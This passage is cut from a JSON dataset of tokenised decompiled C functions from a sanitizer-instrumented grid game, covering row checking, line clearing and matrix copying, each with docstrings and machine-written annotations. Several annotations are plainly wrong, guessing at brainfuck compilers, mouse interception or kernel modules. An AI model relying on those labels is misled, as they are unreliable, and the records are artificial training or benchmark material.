            ")",
            "+",
            "0x7FFF8000",
            ")",
            ")",
            "{",
            "__asan_report_load4",
            "(",
            "g",
            ")",
            ";",
            "}",
            "if",
            "(",
            "i",
            ">",
            "=",
            "g",
            "-",
            ">",
            "n",
            ")",
            "break",
            ";",
            "s",
            "=",
            "0",
            ";",
            "for",
            "(",
            "j",
            "=",
            "0",
            ";",
            ";",
            "+",
            "+",
            "j",
            ")",
            "{",
            "if",
            "(",
            "!",
            "g",
            "|",
            "|",
            "(",
            "(",
            "unsigned",
            "__int8",
            ")",
            "g",
            "&",
            "3",
            ")",
            "!",
            "=",
            "0",
            ")",
            "__ubsan_handle_type_mismatch",
            "(",
            "off_22C300",
            ",",
            "g",
            ")",
            ";",
            "if",
            "(",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "&",
            "g",
            "-",
            ">",
            "m",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "!",
            "=",
            "0",
            "&",
            "&",
            "(",
            "char",
            ")",
            "(",
            "(",
            "(",
            "(",
            "_BYTE",
            ")",
            "g",
            "+",
            "4",
            ")",
            "&",
            "7",
            ")",
            "+",
            "3",
            ")",
            ">",
            "=",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "&",
            "g",
            "-",
            ">",
            "m",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            ")",
            "{",
            "__asan_report_load4",
            "(",
            "&",
            "g",
            "-",
            ">",
            "m",
            ")",
            ";",
            "}",
            "if",
            "(",
            "j",
            ">",
            "=",
            "g",
            "-",
            ">",
            "m",
            ")",
            "break",
            ";",
            "if",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "i",
            ">",
            "0xF",
            ")",
            "__ubsan_handle_out_of_bounds",
            "(",
            "&",
            "off_22C220",
            ",",
            "i",
            ")",
            ";",
            "if",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "j",
            ">",
            "9",
            ")",
            "__ubsan_handle_out_of_bounds",
            "(",
            "&",
            "off_22C260",
            ",",
            "j",
            ")",
            ";",
            "if",
            "(",
            "!",
            "g",
            "|",
            "|",
            "(",
            "(",
            "unsigned",
            "__int8",
            ")",
            "g",
            "&",
            "3",
            ")",
            "!",
            "=",
            "0",
            ")",
            "__ubsan_handle_type_mismatch",
            "(",
            "&",
            "off_22C2A0",
            ",",
            "g",
            ")",
            ";",
            "v1",
            "=",
            "(",
            "unsigned",
            "__int64",
            ")",
            "&",
            "g",
            "-",
            ">",
            "grid",
            "[",
            "i",
            "]",
            "[",
            "j",
            "]",
            ";",
            "if",
            "(",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "v1",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "!",
            "=",
            "0",
            "&",
            "&",
            "(",
            "(",
            "16",
            "*",
            "(",
            "j",
            "+",
            "10",
            "*",
            "i",
            "+",
            "1",
            ")",
            "+",
            "(",
            "unsigned",
            "__int8",
            ")",
            "g",
            "+",
            "4",
            ")",
            "&",
            "7",
            ")",
            ">",
            "=",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "v1",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            ")",
            "{",
            "__asan_report_load1",
            "(",
            "&",
            "g",
            "-",
            ">",
            "grid",
            "[",
            "i",
            "]",
            "[",
            "j",
            "]",
            ")",
            ";",
            "}",
            "v2",
            "=",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "v1",
            ";",
            "if",
            "(",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "v1",
            ">",
            "1u",
            ")",
            "__ubsan_handle_load_invalid_value",
            "(",
            "&",
            "off_22F0C0",
            ",",
            "v2",
            ")",
            ";",
            "if",
            "(",
            "v2",
            ")",
            "{",
            "if",
            "(",
            "__OFADD__",
            "(",
            "1",
            ",",
            "s",
            ")",
            ")",
            "__ubsan_handle_add_overflow",
            "(",
            "&",
            "off_22C420",
            ",",
            "s",
            ",",
            "1L",
            "L",
            ")",
            ";",
            "+",
            "+",
            "s",
            ";",
            "}",
            "if",
            "(",
            "__OFADD__",
            "(",
            "1",
            ",",
            "j",
            ")",
            ")",
            "__ubsan_handle_add_overflow",
            "(",
            "off_22C460",
            ",",
            "j",
            ",",
            "1L",
            "L",
            ")",
            ";",
            "}",
            "if",
            "(",
            "!",
            "g",
            "|",
            "|",
            "(",
            "(",
            "unsigned",
            "__int8",
            ")",
            "g",
            "&",
            "3",
            ")",
            "!",
            "=",
            "0",
            ")",
            "__ubsan_handle_type_mismatch",
            "(",
            "&",
            "off_22C360",
            ",",
            "g",
            ")",
            ";",
            "if",
            "(",
            "s",
            "=",
            "=",
            "g",
            "-",
            ">",
            "m",
            ")",
            "return",
            "i",
            ";",
            "if",
            "(",
            "__OFADD__",
            "(",
            "1",
            ",",
            "i",
            ")",
            ")",
            "__ubsan_handle_add_overflow",
            "(",
            "&",
            "off_22C4A0",
            ",",
            "i",
            ",",
            "1L",
            "L",
            ")",
            ";",
            "}",
            "return",
            "-",
            "1",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The function `san_handle_type` appears to handle type mismatch errors detected by the Undefined Behavior Sanitizer (UBSan) in C/C++ code, providing implementations for various type mismatch scenarios such as addition, subtraction, multiplication, division, and other operations, as well as handling null pointer dereferences, misaligned accesses, and object size mismatches.",
            "The function \"mismatch\" appears to handle error cases or inconsistencies within a program, possibly related to mismatched brackets in a brainfuck compiler, mismatched endianness or architecture in data processing, or mismatched versions in RPC calls, serving as a generic error handler for various types of mismatches.",
            "The function \"asan_report\" is likely a part of AddressSanitizer (ASan) implementation in a system, responsible for reporting memory errors such as use-after-scope or unknown crashes along with their respective bug types and memory addresses, contributing to runtime memory error detection and debugging.",
            "The function `handle` appears to be involved in creating an InterceptionContext for handling low-level input events, potentially for tasks like mouse input interception, error handling with defined error codes, and mechanisms for handling UTF-8 strings and regular expressions in Awk programming.",
            "The `report_load4` function is responsible for reporting memory access errors of size 4 bytes (32 bits) in memory sanitizer tools such as AddressSanitizer (ASan) and KernelAddressSanitizer (KASan)."
        ],
        "longer_label": "The provided code is a C function called \"check\" which appears to validate elements of a game structure, utilizing various error handling functions such as `__ubsan_handle_type_mismatch`, `__asan_report_load`, and `__ubsan_handle_out_of_bounds`, likely integrated with sanitizers like Undefined Behavior Sanitizer (UBSan) and AddressSanitizer (ASan) to detect and handle memory errors and type mismatches within the game's grid structure."
    },
    {
        "id": 208,
        "docstring_tokens": [
            "The",
            "function",
            "emptyLine",
            "moves",
            "all",
            "elements",
            "in",
            "a",
            "given",
            "line",
            "of",
            "a",
            "game",
            "grid",
            "down",
            "by",
            "one",
            "position",
            "and",
            "sets",
            "the",
            "first",
            "row",
            "to",
            "be",
            "empty",
            "."
        ],
        "code_tokens": [
            "void",
            "__cdecl",
            "FUN0",
            "(",
            "int",
            "line",
            ",",
            "game_0",
            "*",
            "g",
            ")",
            "{",
            "int",
            "v2",
            ";",
            "int",
            "v3",
            ";",
            "char",
            "v4",
            ";",
            "bool",
            "v5",
            ";",
            "char",
            "v6",
            ";",
            "char",
            "v7",
            ";",
            "bool",
            "v8",
            ";",
            "char",
            "v9",
            ";",
            "int",
            "*",
            "v10",
            ";",
            "int",
            "*",
            "v11",
            ";",
            "__int64",
            "v12",
            ";",
            "char",
            "v13",
            ";",
            "char",
            "v14",
            ";",
            "char",
            "v15",
            ";",
            "char",
            "v16",
            ";",
            "int",
            "j",
            ";",
            "int",
            "ja",
            ";",
            "while",
            "(",
            "line",
            ">",
            "0",
            ")",
            "{",
            "for",
            "(",
            "j",
            "=",
            "0",
            ";",
            ";",
            "+",
            "+",
            "j",
            ")",
            "{",
            "if",
            "(",
            "!",
            "g",
            "|",
            "|",
            "(",
            "(",
            "unsigned",
            "__int8",
            ")",
            "g",
            "&",
            "3",
            ")",
            "!",
            "=",
            "0",
            ")",
            "__ubsan_handle_type_mismatch",
            "(",
            "&",
            "off_22C6A0",
            ",",
            "g",
            ")",
            ";",
            "if",
            "(",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "&",
            "g",
            "-",
            ">",
            "m",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "!",
            "=",
            "0",
            "&",
            "&",
            "(",
            "char",
            ")",
            "(",
            "(",
            "(",
            "(",
            "_BYTE",
            ")",
            "g",
            "+",
            "4",
            ")",
            "&",
            "7",
            ")",
            "+",
            "3",
            ")",
            ">",
            "=",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "&",
            "g",
            "-",
            ">",
            "m",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            ")",
            "{",
            "__asan_report_load4",
            "(",
            "&",
            "g",
            "-",
            ">",
            "m",
            ")",
            ";",
            "}",
            "if",
            "(",
            "j",
            ">",
            "=",
            "g",
            "-",
            ">",
            "m",
            ")",
            "break",
            ";",
            "v2",
            "=",
            "line",
            "-",
            "1",
            ";",
            "if",
            "(",
            "__OFSUB__",
            "(",
            "line",
            ",",
            "1",
            ")",
            ")",
            "__ubsan_handle_sub_overflow",
            "(",
            "&",
            "off_22C920",
            ",",
            "line",
            ",",
            "1L",
            "L",
            ")",
            ";",
            "v3",
            "=",
            "line",
            "-",
            "1",
            ";",
            "if",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "v2",
            ">",
            "0xF",
            ")",
            "__ubsan_handle_out_of_bounds",
            "(",
            "&",
            "off_22C4E0",
            ",",
            "v2",
            ")",
            ";",
            "if",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "j",
            ">",
            "9",
            ")",
            "__ubsan_handle_out_of_bounds",
            "(",
            "&",
            "off_22C520",
            ",",
            "j",
            ")",
            ";",
            "if",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "line",
            ">",
            "0xF",
            ")",
            "__ubsan_handle_out_of_bounds",
            "(",
            "&",
            "off_22C560",
            ",",
            "line",
            ")",
            ";",
            "if",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "j",
            ">",
            "9",
            ")",
            "__ubsan_handle_out_of_bounds",
            "(",
            "&",
            "off_22C5A0",
            ",",
            "j",
            ")",
            ";",
            "if",
            "(",
            "!",
            "g",
            "|",
            "|",
            "(",
            "(",
            "unsigned",
            "__int8",
            ")",
            "g",
            "&",
            "3",
            ")",
            "!",
            "=",
            "0",
            ")",
            "__ubsan_handle_type_mismatch",
            "(",
            "&",
            "off_22C5E0",
            ",",
            "g",
            ")",
            ";",
            "if",
            "(",
            "!",
            "g",
            "|",
            "|",
            "(",
            "(",
            "unsigned",
            "__int8",
            ")",
            "g",
            "&",
            "3",
            ")",
            "!",
            "=",
            "0",
            ")",
            "__ubsan_handle_type_mismatch",
            "(",
            "&",
            "off_22C640",
            ",",
            "g",
            ")",
            ";",
            "v4",
            "=",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "&",
            "g",
            "-",
            ">",
            "grid",
            "[",
            "line",
            "]",
            "[",
            "j",
            "]",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            ";",
            "v5",
            "=",
            "(",
            "(",
            "16",
            "*",
            "(",
            "j",
            "+",
            "10",
            "*",
            "line",
            "+",
            "1",
            ")",
            "+",
            "(",
            "unsigned",
            "__int8",
            ")",
            "g",
            "+",
            "4",
            ")",
            "&",
            "7",
            ")",
            ">",
            "=",
            "v4",
            "&",
            "&",
            "v4",
            "!",
            "=",
            "0",
            ";",
            "v6",
            "=",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "&",
            "g",
            "-",
            ">",
            "grid",
            "[",
            "line",
            "]",
            "[",
            "j",
            "]",
            ".",
            "c",
            ".",
            "b",
            "+",
            "3",
            ")",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            ";",
            "if",
            "(",
            "v5",
            "|",
            "|",
            "v6",
            "!",
            "=",
            "0",
            "&",
            "&",
            "(",
            "(",
            "16",
            "*",
            "(",
            "j",
            "+",
            "10",
            "*",
            "line",
            "+",
            "1",
            ")",
            "+",
            "(",
            "unsigned",
            "__int8",
            ")",
            "g",
            "+",
            "19",
            ")",
            "&",
            "7",
            ")",
            ">",
            "=",
            "v6",
            ")",
            "__asan_report_store_n",
            "(",
            "&",
            "g",
            "-",
            ">",
            "grid",
            "[",
            "line",
            "]",
            "[",
            "j",
            "]",
            ",",
            "16L",
            "L",
            ")",
            ";",
            "v7",
            "=",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "&",
            "g",
            "-",
            ">",
            "grid",
            "[",
            "v3",
            "]",
            "[",
            "j",
            "]",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            ";",
            "v8",
            "=",
            "(",
            "(",
            "16",
            "*",
            "(",
            "j",
            "+",
            "10",
            "*",
            "v3",
            "+",
            "1",
            ")",
            "+",
            "(",
            "unsigned",
            "__int8",
            ")",
            "g",
            "+",
            "4",
            ")",
            "&",
            "7",
            ")",
            ">",
            "=",
            "v7",
            "&",
            "&",
            "v7",
            "!",
            "=",
            "0",
            ";",
            "v9",
            "=",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "&",
            "g",
            "-",
            ">",
            "grid",
            "[",
            "v3",
            "]",
            "[",
            "j",
            "]",
            ".",
            "c",
            ".",
            "b",
            "+",
            "3",
            ")",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            ";",
            "if",
            "(",
            "v8",
            "|",
            "|",
            "v9",
            "!",
            "=",
            "0",
            "&",
            "&",
            "(",
            "(",
            "16",
            "*",
            "(",
            "j",
            "+",
            "10",
            "*",
            "v3",
            "+",
            "1",
            ")",
            "+",
            "(",
            "unsigned",
            "__int8",
            ")",
            "g",
            "+",
            "19",
            ")",
            "&",
            "7",
            ")",
            ">",
            "=",
            "v9",
            ")",
            "__asan_report_load_n",
            "(",
            "&",
            "g",
            "-",
            ">",
            "grid",
            "[",
            "v3",
            "]",
            "[",
            "j",
            "]",
            ",",
            "16L",
            "L",
            ")",
            ";",
            "v10",
            "=",
            "&",
            "g",
            "-",
            ">",
            "ls",
            "+",
            "40",
            "*",
            "line",
            "+",
            "4",
            "*",
            "j",
            ";",
            "v11",
            "=",
            "&",
            "g",
            "-",
            ">",
            "ls",
            "+",
            "40",
            "*",
            "v3",
            "+",
            "4",
            "*",
            "j",
            ";",
            "v12",
            "=",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "v11",
            "+",
            "3",
            ")",
            ";",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "v10",
            "+",
            "1",
            ")",
            "=",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "v11",
            "+",
            "1",
            ")",
            ";",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "v10",
            "+",
            "3",
            ")",
            "=",
            "v12",
            ";",
            "if",
            "(",
            "__OFADD__",
            "(",
            "1",
            ",",
            "j",
            ")",
            ")",
            "__ubsan_handle_add_overflow",
            "(",
            "&",
            "off_22C960",
            ",",
            "j",
            ",",
            "1L",
            "L",
            ")",
            ";",
            "}",
            "if",
            "(",
            "__OFSUB__",
            "(",
            "line",
            ",",
            "1",
            ")",
            ")",
            "__ubsan_handle_sub_overflow",
            "(",
            "&",
            "off_22C9A0",
            ",",
            "line",
            ",",
            "1L",
            "L",
            ")",
            ";",
            "-",
            "-",
            "line",
            ";",
            "}",
            "for",
            "(",
            "ja",
            "=",
            "0",
            ";",
            ";",
            "+",
            "+",
            "ja",
            ")",
            "{",
            "if",
            "(",
            "!",
            "g",
            "|",
            "|",
            "(",
            "(",
            "unsigned",
            "__int8",
            ")",
            "g",
            "&",
            "3",
            ")",
            "!",
            "=",
            "0",
            ")",
            "__ubsan_handle_type_mismatch",
            "(",
            "&",
            "off_22C8C0",
            ",",
            "g",
            ")",
            ";",
            "if",
            "(",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "&",
            "g",
            "-",
            ">",
            "m",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "!",
            "=",
            "0",
            "&",
            "&",
            "(",
            "char",
            ")",
            "(",
            "(",
            "(",
            "(",
            "_BYTE",
            ")",
            "g",
            "+",
            "4",
            ")",
            "&",
            "7",
            ")",
            "+",
            "3",
            ")",
            ">",
            "=",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "&",
            "g",
            "-",
            ">",
            "m",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            ")",
            "{",
            "__asan_report_load4",
            "(",
            "&",
            "g",
            "-",
            ">",
            "m",
            ")",
            ";",
            "}",
            "if",
            "(",
            "ja",
            ">",
            "=",
            "g",
            "-",
            ">",
            "m",
            ")",
            "break",
            ";",
            "if",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "ja",
            ">",
            "9",
            ")",
            "__ubsan_handle_out_of_bounds",
            "(",
            "&",
            "off_22C700",
            ",",
            "ja",
            ")",
            ";",
            "if",
            "(",
            "!",
            "g",
            "|",
            "|",
            "(",
            "(",
            "unsigned",
            "__int8",
            ")",
            "g",
            "&",
            "3",
            ")",
            "!",
            "=",
            "0",
            ")",
            "__ubsan_handle_type_mismatch",
            "(",
            "&",
            "off_22C740",
            ",",
            "g",
            ")",
            ";",
            "v13",
            "=",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "g",
            "-",
            ">",
            "grid",
            "+",
            "16",
            "*",
            "ja",
            ")",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            ";",
            "if",
            "(",
            "v13",
            "!",
            "=",
            "0",
            "&",
            "&",
            "(",
            "(",
            "16",
            "*",
            "(",
            "ja",
            "+",
            "1",
            ")",
            "+",
            "(",
            "unsigned",
            "__int8",
            ")",
            "g",
            "+",
            "4",
            ")",
            "&",
            "7",
            ")",
            ">",
            "=",
            "v13",
            ")",
            "__asan_report_store1",
            "(",
            "(",
            "char",
            "*",
            ")",
            "g",
            "-",
            ">",
            "grid",
            "+",
            "16",
            "*",
            "ja",
            ")",
            ";",
            "g",
            "-",
            ">",
            "grid",
            "[",
            "0",
            "]",
            "[",
            "ja",
            "]",
            ".",
            "state",
            "=",
            "0",
            ";",
            "if",
            "(",
            "!",
            "g",
            "|",
            "|",
            "(",
            "(",
            "unsigned",
            "__int8",
            ")",
            "g",
            "&",
            "3",
            ")",
            "!",
            "=",
            "0",
            ")",
            "__ubsan_handle_type_mismatch",
            "(",
            "&",
            "off_22C7A0",
            ",",
            "g",
            ")",
            ";",
            "v14",
            "=",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "&",
            "g",
            "-",
            ">",
            "grid",
            "[",
            "0",
            "]",
            "[",
            "ja",
            "]",
            ".",
            "c",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            ";",
            "if",
            "(",
            "v14",
            "!",
            "=",
            "0",
            "&",
            "&",
            "(",
            "char",
            ")",
            "(",
            "(",
            "(",
            "16",
            "*",
            "(",
            "ja",
            "+",
            "1",
            ")",
            "+",
            "(",
            "_BYTE",
            ")",
            "g",
            "+",
            "8",
            ")",
            "&",
            "7",
            ")",
            "+",
            "3",
            ")",
            ">",
            "=",
            "v14",
            ")",
            "__asan_report_store4",
            "(",
            "&",
            "g",
            "-",
            ">",
            "grid",
            "[",
            "0",
            "]",
            "[",
            "ja",
            "]",
            ".",
            "c",
            ")",
            ";",
            "g",
            "-",
            ">",
            "grid",
            "[",
            "0",
            "]",
            "[",
            "ja",
            "]",
            ".",
            "c",
            ".",
            "r",
            "=",
            "0",
            ";",
            "if",
            "(",
            "!",
            "g",
            "|",
            "|",
            "(",
            "(",
            "unsigned",
            "__int8",
            ")",
            "g",
            "&",
            "3",
            ")",
            "!",
            "=",
            "0",
            ")",
            "__ubsan_handle_type_mismatch",
            "(",
            "&",
            "off_22C800",
            ",",
            "g",
            ")",
            ";",
            "v15",
            "=",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "&",
            "g",
            "-",
            ">",
            "grid",
            "[",
            "0",
            "]",
            "[",
            "ja",
            "]",
            ".",
            "c",
            ".",
            "g",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            ";",
            "if",
            "(",
            "v15",
            "!",
            "=",
            "0",
            "&",
            "&",
            "(",
            "char",
            ")",
            "(",
            "(",
            "(",
            "16",
            "*",
            "(",
            "ja",
            "+",
            "1",
            ")",
            "+",
            "(",
            "_BYTE",
            ")",
            "g",
            "+",
            "12",
            ")",
            "&",
            "7",
            ")",
            "+",
            "3",
            ")",
            ">",
            "=",
            "v15",
            ")",
            "__asan_report_store4",
            "(",
            "&",
            "g",
            "-",
            ">",
            "grid",
            "[",
            "0",
            "]",
            "[",
            "ja",
            "]",
            ".",
            "c",
            ".",
            "g",
            ")",
            ";",
            "g",
            "-",
            ">",
            "grid",
            "[",
            "0",
            "]",
            "[",
            "ja",
            "]",
            ".",
            "c",
            ".",
            "g",
            "=",
            "0",
            ";",
            "if",
            "(",
            "!",
            "g",
            "|",
            "|",
            "(",
            "(",
            "unsigned",
            "__int8",
            ")",
            "g",
            "&",
            "3",
            ")",
            "!",
            "=",
            "0",
            ")",
            "__ubsan_handle_type_mismatch",
            "(",
            "&",
            "off_22C860",
            ",",
            "g",
            ")",
            ";",
            "v16",
            "=",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "&",
            "g",
            "-",
            ">",
            "grid",
            "[",
            "0",
            "]",
            "[",
            "ja",
            "]",
            ".",
            "c",
            ".",
            "b",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            ";",
            "if",
            "(",
            "v16",
            "!",
            "=",
            "0",
            "&",
            "&",
            "(",
            "char",
            ")",
            "(",
            "(",
            "(",
            "16",
            "*",
            "(",
            "ja",
            "+",
            "1",
            ")",
            "+",
            "(",
            "_BYTE",
            ")",
            "g",
            "+",
            "16",
            ")",
            "&",
            "7",
            ")",
            "+",
            "3",
            ")",
            ">",
            "=",
            "v16",
            ")",
            "__asan_report_store4",
            "(",
            "&",
            "g",
            "-",
            ">",
            "grid",
            "[",
            "0",
            "]",
            "[",
            "ja",
            "]",
            ".",
            "c",
            ".",
            "b",
            ")",
            ";",
            "g",
            "-",
            ">",
            "grid",
            "[",
            "0",
            "]",
            "[",
            "ja",
            "]",
            ".",
            "c",
            ".",
            "b",
            "=",
            "0",
            ";",
            "if",
            "(",
            "__OFADD__",
            "(",
            "1",
            ",",
            "ja",
            ")",
            ")",
            "__ubsan_handle_add_overflow",
            "(",
            "&",
            "off_22C9E0",
            ",",
            "ja",
            ",",
            "1L",
            "L",
            ")",
            ";",
            "}",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The function `san_handle_type` seems to be part of a sanitizer implementation, specifically handling type mismatches, misaligned accesses, and object size mismatches, with additional support for other overflow and bounds-related errors, primarily in a C/C++ codebase.",
            "The function `mismatch` seems to handle error cases related to mismatched brackets in a brainfuck compiler, printing an error message and exiting with status 1, possibly indicating a syntax error in the code being compiled.",
            "The function `report_load` seems to be used in two different contexts: one within a kernel module to handle load-related events like access checks, and another within a Linux kernel module for reporting prohibited mount paths with symlinks, possibly in a security or access control mechanism.",
            "The \"handle\" function likely creates a context for interception, possibly for handling mouse input data, managing device arrays, and potentially dealing with error handling for various system calls, while also mentioning mechanisms for handling UTF-8 encoded strings in Awk.",
            "The `sub_overflow` function is used to determine if a subtraction operation between two unsigned 64-bit integers overflows, considering their bitwise XOR and AND operations, typically used in low-level programming for arithmetic or bitwise operations where overflow handling is crucial."
        ],
        "longer_label": "The provided code appears to be a C/C++ function implementing game logic, with extensive error handling for type mismatches, overflow, and out-of-bounds accesses, while the annotations suggest potential contexts involving a sanitizer implementation, a brainfuck compiler, and kernel modules handling load events and mount path security in a Linux environment."
    },
    {
        "id": 209,
        "docstring_tokens": [
            "This",
            "code",
            "copies",
            "the",
            "elements",
            "of",
            "matrix",
            "s",
            "to",
            "matrix",
            "d",
            "with",
            "dimensions",
            "n",
            "and",
            "m",
            "."
        ],
        "code_tokens": [
            "void",
            "__cdecl",
            "FUN0",
            "(",
            "int",
            "n",
            ",",
            "int",
            "m",
            ",",
            "cell_0",
            "(",
            "*",
            "d",
            ")",
            "[",
            "]",
            ",",
            "cell_0",
            "(",
            "*",
            "s",
            ")",
            "[",
            "]",
            ")",
            "{",
            "char",
            "*",
            "v4",
            ";",
            "char",
            "*",
            "v5",
            ";",
            "unsigned",
            "__int64",
            "v6",
            ";",
            "unsigned",
            "__int64",
            "v7",
            ";",
            "char",
            "*",
            "v8",
            ";",
            "char",
            "*",
            "v9",
            ";",
            "__int64",
            "v10",
            ";",
            "int",
            "j",
            ";",
            "int",
            "i",
            ";",
            "if",
            "(",
            "__OFSUB__",
            "(",
            "m",
            ",",
            "1L",
            "L",
            ")",
            ")",
            "__ubsan_handle_sub_overflow",
            "(",
            "&",
            "off_22CB60",
            ",",
            "m",
            ",",
            "1L",
            "L",
            ")",
            ";",
            "if",
            "(",
            "__OFSUB__",
            "(",
            "m",
            ",",
            "1L",
            "L",
            ")",
            ")",
            "__ubsan_handle_sub_overflow",
            "(",
            "&",
            "off_22CBA0",
            ",",
            "m",
            ",",
            "1L",
            "L",
            ")",
            ";",
            "for",
            "(",
            "i",
            "=",
            "0",
            ";",
            "i",
            "<",
            "n",
            ";",
            "+",
            "+",
            "i",
            ")",
            "{",
            "for",
            "(",
            "j",
            "=",
            "0",
            ";",
            "j",
            "<",
            "m",
            ";",
            "+",
            "+",
            "j",
            ")",
            "{",
            "v4",
            "=",
            "(",
            "char",
            "*",
            ")",
            "s",
            "+",
            "16",
            "*",
            "i",
            "*",
            "(",
            "__int64",
            ")",
            "m",
            ";",
            "if",
            "(",
            "__OFSUB__",
            "(",
            "m",
            ",",
            "1L",
            "L",
            ")",
            ")",
            "__ubsan_handle_sub_overflow",
            "(",
            "&",
            "off_22CBE0",
            ",",
            "m",
            ",",
            "1L",
            "L",
            ")",
            ";",
            "if",
            "(",
            "j",
            ">",
            "(",
            "unsigned",
            "__int64",
            ")",
            "(",
            "m",
            "-",
            "1L",
            "L",
            ")",
            ")",
            "__ubsan_handle_out_of_bounds",
            "(",
            "&",
            "off_22CA20",
            ",",
            "j",
            ")",
            ";",
            "v5",
            "=",
            "(",
            "char",
            "*",
            ")",
            "d",
            "+",
            "16",
            "*",
            "i",
            "*",
            "(",
            "__int64",
            ")",
            "m",
            ";",
            "if",
            "(",
            "__OFSUB__",
            "(",
            "m",
            ",",
            "1L",
            "L",
            ")",
            ")",
            "__ubsan_handle_sub_overflow",
            "(",
            "&",
            "off_22CC20",
            ",",
            "m",
            ",",
            "1L",
            "L",
            ")",
            ";",
            "if",
            "(",
            "j",
            ">",
            "(",
            "unsigned",
            "__int64",
            ")",
            "(",
            "m",
            "-",
            "1L",
            "L",
            ")",
            ")",
            "__ubsan_handle_out_of_bounds",
            "(",
            "&",
            "off_22CA60",
            ",",
            "j",
            ")",
            ";",
            "if",
            "(",
            "!",
            "v5",
            "|",
            "|",
            "(",
            "(",
            "unsigned",
            "__int8",
            ")",
            "v5",
            "&",
            "3",
            ")",
            "!",
            "=",
            "0",
            ")",
            "__ubsan_handle_type_mismatch",
            "(",
            "&",
            "off_22CAA0",
            ",",
            "v5",
            ")",
            ";",
            "if",
            "(",
            "!",
            "v4",
            "|",
            "|",
            "(",
            "(",
            "unsigned",
            "__int8",
            ")",
            "v4",
            "&",
            "3",
            ")",
            "!",
            "=",
            "0",
            ")",
            "__ubsan_handle_type_mismatch",
            "(",
            "&",
            "off_22CB00",
            ",",
            "v4",
            ")",
            ";",
            "v6",
            "=",
            "(",
            "unsigned",
            "__int64",
            ")",
            "&",
            "v5",
            "[",
            "16",
            "*",
            "j",
            "]",
            ";",
            "if",
            "(",
            "(",
            "(",
            "(",
            "unsigned",
            "__int8",
            ")",
            "v5",
            "+",
            "16",
            "*",
            "j",
            ")",
            "&",
            "7",
            ")",
            ">",
            "=",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "v6",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "&",
            "&",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "v6",
            ">",
            ">",
            "3",
            ")",
            "+",
